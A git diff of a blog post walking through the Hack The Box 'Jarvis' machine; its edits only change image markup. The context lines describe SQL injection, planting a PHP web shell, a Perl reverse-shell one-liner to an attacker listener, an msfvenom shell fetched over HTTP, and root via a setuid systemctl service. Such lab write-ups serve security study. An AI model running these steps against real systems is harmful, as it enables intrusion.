@@ -74,15 +74,15 @@ Stark Hotel? I'm sensing an Iron-Man theme here. :laughing: It appears that `649
 
 _80/tcp_
 
-<a class="image-popup">
-![900ac137.png](/assets/images/posts/jarvis-htb-walkthrough/900ac137.png)
-</a>
+
+{% include image.html image_alt="900ac137.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/900ac137.png" %}
+
 
 _64999/tcp_
 
-<a class="image-popup">
-![835a70ee.png](/assets/images/posts/jarvis-htb-walkthrough/835a70ee.png)
-</a>
+
+{% include image.html image_alt="835a70ee.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/835a70ee.png" %}
+
 
 Hmm. Some kind of anti-bruteforce mechanism is in place.
 
@@ -90,9 +90,9 @@ Hmm. Some kind of anti-bruteforce mechanism is in place.
 
 It wasn't long before I found a page that may possibly be susceptible to SQL injection.
 
-<a class="image-popup">
-![26bafacb.png](/assets/images/posts/jarvis-htb-walkthrough/26bafacb.png)
-</a>
+
+{% include image.html image_alt="26bafacb.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/26bafacb.png" %}
+
 
 I made a guess—the database could be MySQL.
 
@@ -102,9 +102,9 @@ I made a guess—the database could be MySQL.
 
 Bingo!
 
-<a class="image-popup">
-![6d8f2a7d.png](/assets/images/posts/jarvis-htb-walkthrough/6d8f2a7d.png)
-</a>
+
+{% include image.html image_alt="6d8f2a7d.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/6d8f2a7d.png" %}
+
 
 Armed with that insight, I could write/inject a PHP file to `/images` directory of the Apache default installation. This directory is almost certain to be writable by `www-data`. The PHP file is simple.
 
@@ -147,9 +147,9 @@ rm -f $COOKIE
 
 Running the script without argument creates `cmd.php` in `/images`.
 
-<a class="image-popup">
-![f2c794ca.png](/assets/images/posts/jarvis-htb-walkthrough/f2c794ca.png)
-</a>
+
+{% include image.html image_alt="f2c794ca.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/f2c794ca.png" %}
+
 
 ## Low-Privilege Shell
 
@@ -161,31 +161,31 @@ perl -e 'use Socket;$i="10.10.14.163";$p=1234;socket(S,PF_INET,SOCK_STREAM,getpr
 
 Bam.
 
-<a class="image-popup">
-![91071a5b.png](/assets/images/posts/jarvis-htb-walkthrough/91071a5b.png)
-</a>
+
+{% include image.html image_alt="91071a5b.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/91071a5b.png" %}
+
 
 ## Privilege Escalation
 
 During enumeration of `www-data`'s account, I noted that `www-data` is able to `sudo` as `pepper` to run a Python script.
 
-<a class="image-popup">
-![e3c8db1e.png](/assets/images/posts/jarvis-htb-walkthrough/e3c8db1e.png)
-</a>
+
+{% include image.html image_alt="e3c8db1e.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/e3c8db1e.png" %}
+
 
 ### Getting `user.txt`
 
 Check out the function `exec_ping()` in `simpler.py`.
 
-<a class="image-popup">
-![8ac6dfe4.png](/assets/images/posts/jarvis-htb-walkthrough/8ac6dfe4.png)
-</a>
+
+{% include image.html image_alt="8ac6dfe4.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/8ac6dfe4.png" %}
+
 
 We can easily bypass the filter and get ourselves a shell as `pepper`. First, we create a reverse shell with `msfvenom`.
 
-<a class="image-popup">
-![73c35f66.png](/assets/images/posts/jarvis-htb-walkthrough/73c35f66.png)
-</a>
+
+{% include image.html image_alt="73c35f66.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/73c35f66.png" %}
+
 
 Next, we host the reverse shell with Python's SimpleHTTPServer module.
 
@@ -195,59 +195,59 @@ Next, we host the reverse shell with Python's SimpleHTTPServer module.
 
 Finally, let's download the file.
 
-<a class="image-popup">
-![324934ad.png](/assets/images/posts/jarvis-htb-walkthrough/324934ad.png)
-</a>
+
+{% include image.html image_alt="324934ad.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/324934ad.png" %}
+
 
 We need to `chmod` the file to be executable as well. I'll leave that as an exercise. Once that's done, we can run the reverse shell over to us.
 
-<a class="image-popup">
-![62b3a175.png](/assets/images/posts/jarvis-htb-walkthrough/62b3a175.png)
-</a>
+
+{% include image.html image_alt="62b3a175.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/62b3a175.png" %}
+
 
 On our `nc` listener, a reverse shell appears...
 
-<a class="image-popup">
-![8ab63511.png](/assets/images/posts/jarvis-htb-walkthrough/8ab63511.png)
-</a>
+
+{% include image.html image_alt="8ab63511.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/8ab63511.png" %}
+
 
 `user.txt` is at `pepper`'s home directory.
 
-<a class="image-popup">
-![b37fb682.png](/assets/images/posts/jarvis-htb-walkthrough/b37fb682.png)
-</a>
+
+{% include image.html image_alt="b37fb682.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/b37fb682.png" %}
+
 
 ### Getting `root.txt`
 
 During enumeration of `pepper`'s account, I noted a `setuid` `systemctl` executable where the group `pepper` has the right to execute it.
 
-<a class="image-popup">
-![9aafd008.png](/assets/images/posts/jarvis-htb-walkthrough/9aafd008.png)
-</a>
+
+{% include image.html image_alt="9aafd008.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/9aafd008.png" %}
+
 
 This executable is associated with controlling `systemd` services. I guess I have to create my own service. :triumph:
 
-<a class="image-popup">
-![32d86c64.png](/assets/images/posts/jarvis-htb-walkthrough/32d86c64.png)
-</a>
+
+{% include image.html image_alt="32d86c64.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/32d86c64.png" %}
+
 
 Next, symlink `/etc/systemd/system/aaa.service` to `/tmp/aaa.service`.
 
-<a class="image-popup">
-![ac0c4c8d.png](/assets/images/posts/jarvis-htb-walkthrough/ac0c4c8d.png)
-</a>
+
+{% include image.html image_alt="ac0c4c8d.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/ac0c4c8d.png" %}
+
 
 Start the service `systemctl start aaa` and profit!
 
-<a class="image-popup">
-![0f797379.png](/assets/images/posts/jarvis-htb-walkthrough/0f797379.png)
-</a>
+
+{% include image.html image_alt="0f797379.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/0f797379.png" %}
+
 
 Sweet. Retrieving `root.txt` is trivial with a `root` shell.
 
-<a class="image-popup">
-![0c3b83b8.png](/assets/images/posts/jarvis-htb-walkthrough/0c3b83b8.png)
-</a>
+
+{% include image.html image_alt="0c3b83b8.png" image_src="/3b664597-88d3-4c0a-bd48-b6709238f69f/0c3b83b8.png" %}
+
 
 :dancer:
 
